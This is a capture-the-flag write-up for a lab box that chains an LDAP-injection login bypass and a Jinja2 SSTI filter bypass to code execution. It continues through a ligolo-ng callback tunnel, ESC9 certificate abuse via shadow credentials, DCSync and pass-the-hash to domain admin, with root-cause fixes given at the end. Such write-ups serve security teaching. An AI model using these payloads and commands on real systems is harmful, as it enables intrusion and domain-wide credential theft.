# Donerup — Writeup

> **HTB writeup compliance note:** This document should only be distributed
> once the box is retired / the box owner has approved sharing. Flag values
> are **redacted** per HTB rules (`HTB{...}` format, real content hidden) —
> the reader is expected to obtain the flag themselves. This writeup
> documents the step-by-step methodology for someone who has already solved
> the box; it does not provide a shortcut or ready-made "cheat" script —
> every step explains *why* it works.

## Machine Info

| | |
|---|---|
| **Name** | Donerup |
| **OS** | Linux (foothold) → Windows Server 2022 (Domain Controller) |
| **Difficulty** | Insane |
| **Category** | Active Directory / Web |
| **Domain** | `donerup.htb` |
| **DC** | `DC01.donerup.htb` |
| **Attacker subnet** | `10.10.14.0/23` (VPN client) |
| **Target VLAN** | `10.10.20.0/24` (AD VLAN, reachable only via pivot) |

---

## TL;DR

1. Bypass authentication on the web app via **LDAP injection**, logging in
   as `administrator` (an app-level role, not domain admin).
2. Get **SSTI → RCE** through the report-template feature in the admin
   panel.
3. Find `user.txt` inside the container; a `CHANGELOG.md` hint reveals that
   the real AD service account's (`svc_ldap`) password lives in an
   environment variable.
4. Drop a **ligolo-ng** agent via the RCE foothold and tunnel into the AD
   VLAN (`10.10.20.0/24`).
5. Enumerate AD with the `svc_ldap` credential and find an **ESC9**
   vulnerable certificate template (no security extension).
6. Use `svc_ldap`'s **GenericWrite** over `svc_backup` to compromise it via
   shadow credentials.
7. Change `svc_backup`'s `userPrincipalName` to `administrator`, enroll a
   certificate against the ESC9 template, then restore the UPN to cover
   tracks.
8. Authenticate with the spoofed-UPN certificate via PKINIT → recover the
   **Domain Administrator NT hash**.
9. **DCSync** to dump every domain secret, including `krbtgt` → Domain
   Admin.
10. Read `root.txt` on the DC using the recovered administrator hash.

---

## 1. Recon

### Nmap

```
$ nmap -sC -sV -p- <TARGET_IP>
PORT    STATE SERVICE  VERSION
80/tcp  open  http     nginx (redirects to 443)
443/tcp open  https    nginx — self-signed TLS, fronts a Flask app
```

Port 80 redirects to 443 (TLS enforced). Behind 443 sits a Flask
application with an LDAP-themed login page — the page copy itself hints
("corporate directory login") that real authentication is backed by LDAP.

There are also traces in-app of a second service (`legacy-auth-db`, a
MySQL-backed legacy auth) — this is a **deliberate rabbit hole**: its
account names don't match real AD accounts and it exists purely to burn
time.

---

## 2. Foothold — LDAP Injection

The login form embeds the username directly into an LDAP filter:

```
(&(sAMAccountName={username})(info={password}))
```

The application **blacklists** classic LDAP-injection characters (`(`,
`)`, `*`, `\`). But the filtering order is wrong: ASCII characters are
stripped from the blacklist **first**, and only *afterward* are fullwidth
Unicode look-alike parentheses (`（` U+FF08, `）` U+FF09) normalized back
to their ASCII equivalents. An attacker can smuggle fullwidth parentheses
straight through the blacklist and let the normalization step turn them
into real `(`/`)` — a classic "sanitize before normalize" ordering bug.

**Payload** (username field, using fullwidth parentheses):

```
administrator）（|（sAMAccountName=administrator
```

(the password field just needs a single `）`)

After sanitize + normalize, the filter becomes:

```
(&(sAMAccountName=administrator)(|(sAMAccountName=administrator)(info=))
```

The injected `(|(...)` turns the query into an OR, neutralizing the
password check — the server authenticates `administrator` without ever
validating the password. The app echoes back the directory's resolved
`sAMAccountName` (`Administrator`) rather than the submitted payload on
the dashboard, so no injection trace shows up in the response — but the
session is now `administrator` (app-level role).

> Note: this "administrator" is the web app's own role system, not a
> domain admin — it just grants access to the admin panel.

---

## 3. RCE — SSTI (Jinja2)

The `/admin/report-template` endpoint feeds user input straight into a
Jinja2 `Environment().from_string()` call — classic **Server-Side
Template Injection**.

A naive payload (`{{ ''.__class__ }}`) is blocked: the app scans the
content **inside** `{{ ... }}` / `{% ... %}` blocks for tokens like `__`,
`class`, `mro`, `subclasses`, `import`, `os.`, `popen`, `system`, `eval`,
`exec`, and even a literal space character.

The blacklist only checks for **literal substrings**, so splitting those
tokens with Jinja2's string-concatenation operator (`~`) defeats it
entirely:

```
{{''['_'~'_cla'~'ss_'~'_']}}
```

This bypasses the blacklist and renders `<class 'str'>` — a harmless PoC
confirming RCE is possible.

For real command execution, `lipsum`'s globals give access to `os.popen`
(again split with `~`, and needing no spaces):

```
{{lipsum['_'~'_glo'~'bals'~'_'~'_']['o'~'s']['pop'~'en']('id').read()}}
```

This executes commands inside the container as `appuser`. Since `appuser`
can write and execute in its own home directory, a ligolo-ng agent can be
dropped from here (see §5).

**`user.txt`** sits in `appuser`'s home directory:

```
HTB{c█████████████████████████e}
```

---

## 4. Credential discovery — the CHANGELOG.md hint

`/home/appuser/CHANGELOG.md` inside the container explicitly states that
the old MySQL-backed auth (the §1 rabbit hole) is deprecated, that real
authentication is handled entirely via LDAP bind, and that the bind
credentials live in the container's **environment variables**
(`LDAP_BIND_DN` / `LDAP_BIND_PASSWORD` / `LDAP_SERVER_HOST`).

Running `env` via the RCE foothold reveals `LDAP_BIND_PASSWORD` in plain
text — this is the password for a real AD service account, `svc_ldap`.

---

## 5. Pivot — tunneling into the AD VLAN with ligolo-ng

The container only sits on the `dmz` network and has no direct route to
the AD VLAN (`10.10.20.0/24`) — an iptables chain on the host
(`DONERUP_AD_PIVOT`) only allows traffic sourced from the `internal-ad`
bridge and default-denies anything from `dmz`. Getting past this requires
a tunnel established via the RCE foothold:

```
# In the container (via RCE), drop and run a ligolo-ng agent binary
./agent -connect <attacker-ip>:11601 -ignore-cert

# On the attacker box
ligolo-proxy -selfcert
session
ifconfig
route add 10.10.20.0/24 <tun-iface>
```

Once the tunnel is up, `10.10.20.10` (the DC) becomes directly reachable.

---

## 6. AD Enumeration — ESC9

Enumerating CAs/templates with certipy using the `svc_ldap` credential:

```
certipy find -u svc_ldap@donerup.htb -p '<svc_ldap-password>' -dc-ip 10.10.20.10 -vulnerable
```

The `DonerupUserAuth` template is flagged **ESC9**:

- `Enrollment Flag: NoSecurityExtension` — the certificate isn't stamped
  with the `szOID_NTDS_CA_SECURITY_EXT` security extension, so certificate
  authentication maps **purely by UPN/SAN**, not by the certificate
  owner's actual `objectSid`.
- `Authenticated Users` can enroll against the template.
- The template's `Certificate Name Flag` (`SubjectAltRequireUpn`) embeds
  the requester's **current UPN** as the certificate's SAN.

This opens the door to the classic ESC9 attack: "change your UPN to
`administrator` → enroll against the template → the resulting
certificate authenticates as `administrator`."

---

## 7. GenericWrite → Shadow Credentials → ESC9 chain

BloodHound/certipy enumeration shows `svc_ldap` holds **GenericWrite**
over the `svc_backup` object. That right is enough to write to the
`msDS-KeyCredentialLink` attribute (a "shadow credentials" attack):

```bash
# 1) Add a shadow credential to svc_backup and pull its NT hash
certipy shadow auto -u svc_ldap@donerup.htb -p '<svc_ldap-pw>' \
    -account svc_backup -dc-ip 10.10.20.10

# 2) Change svc_backup's UPN to administrator
certipy account update -u svc_ldap@donerup.htb -p '<svc_ldap-pw>' \
    -user svc_backup -upn administrator -dc-ip 10.10.20.10

# 3) As svc_backup, enroll against the ESC9-vulnerable template
certipy req -u svc_backup@donerup.htb -hashes <svc_backup-nthash> \
    -ca Donerup-CA -template DonerupUserAuth -dc-ip 10.10.20.10

# 4) Restore svc_backup's UPN to cover tracks (a real attacker would do
#    this too, to avoid detection)
certipy account update -u svc_ldap@donerup.htb -p '<svc_ldap-pw>' \
    -user svc_backup -upn svc_backup -dc-ip 10.10.20.10

# 5) PKINIT with the certificate carrying UPN=administrator
certipy auth -pfx svc_backup.pfx -dc-ip 10.10.20.10
```

Because of `NoSecurityExtension`, the KDC reads the certificate's SAN
UPN (`administrator`) and maps it to the **real** `Administrator`
account — even though the certificate still belongs to `svc_backup`
(a different `objectSid`), strong certificate mapping is disabled for
this template, so the mapping falls through to UPN. Result: a valid TGT
and NT hash for `Administrator@donerup.htb`.

---

## 8. DCSync → Domain Admin

With the recovered `Administrator` NT hash, DCSync directly:

```bash
secretsdump.py -hashes aad3b435b51404eeaad3b435b51404ee:<admin-nthash> \
    donerup.htb/administrator@10.10.20.10 -just-dc
```

Every domain hash, including `krbtgt`, is dumped — **Domain Admin**
achieved.

---

## 9. `root.txt`

Pass-the-hash to the DC with the recovered `Administrator` NT hash:

```bash
wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:<admin-nthash> \
    administrator@10.10.20.10
```

`root.txt` sits behind an ACL restricted to `Administrators:(R)` /
`SYSTEM:(F)`:

```
HTB{r█████████████████████████t}
```

---

## Root Cause Analysis

| Step | Root cause |
|---|---|
| LDAP injection | The character blacklist runs **before** Unicode normalization — sanitize-then-normalize instead of normalize-then-sanitize. |
| SSTI | User input is fed straight into `Environment().from_string()`; the only defense is a literal-substring blacklist, trivially defeated with string concatenation (`~`). The correct fix is a sandboxed Jinja2 environment (`ImmutableSandboxedEnvironment`) or removing the template engine entirely. |
| Credential leak | The service account password sits in a container environment variable in plaintext — anyone with RCE can read it via `env`. |
| ESC9 | The combination of `NoSecurityExtension`, a UPN-based SAN, and a writable UPN (via `GenericWrite`) reduces certificate authentication to a UPN match instead of true ownership. |
| DCSync | Once the Domain Admin hash is obtained, this is an inevitable consequence of AD's design — the real break happens at the ESC9 step. |

---

## Beyond Root (not exercised / partial coverage)

- **Network isolation control**: not testable in this environment since
  the attacker already sits on the AD VLAN itself — needs to be tried from
  a real HTB VPN client (`10.10.14.0/23`).
- **Ligolo tunnel**: the steps in §5 are documented, but were not run
  end-to-end automatically while preparing this writeup; DC access was
  verified over the lab environment's own direct route.

---

## Run Timeline (this pass)

| Phase | Result |
|---|---|
| Recon / web foothold | PASS |
| Rabbit hole (legacy-auth-db) elimination | PASS |
| CHANGELOG hint → `svc_ldap` password | PASS |
| Pivot tunnel | Manual / documented |
| ESC9 detection | PASS |
| ESC9 → DCSync chain | PASS |
| `user.txt` | PASS |
| `root.txt` | PASS |

Raw command output: `build/exploit/logs/full-chain-replay-2026-08-28.log`.
